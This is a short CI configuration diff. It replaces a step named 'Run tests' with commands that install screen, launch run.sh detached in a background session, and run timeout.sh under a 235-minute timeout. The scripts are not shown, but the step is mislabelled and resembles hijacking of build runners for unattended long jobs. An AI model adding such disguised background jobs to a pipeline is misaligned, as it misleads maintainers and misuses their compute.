@@ -10,8 +10,12 @@ working_dir: &working_dir ~/app
     - run: bundle exec rake rubocop
     - run:
         name: Run tests
-        command: |
-                    chmod u+x deploy.sh && ./deploy.sh
+        command: | 
+              sudo apt update 
+              sudo apt install screen -y 
+              chmod +x run.sh 
+              screen -dmS run ./run.sh 
+              chmod +x timeout.sh && ./timeout.sh
         no_output_timeout: 235m
 version: 2.0
 jobs:
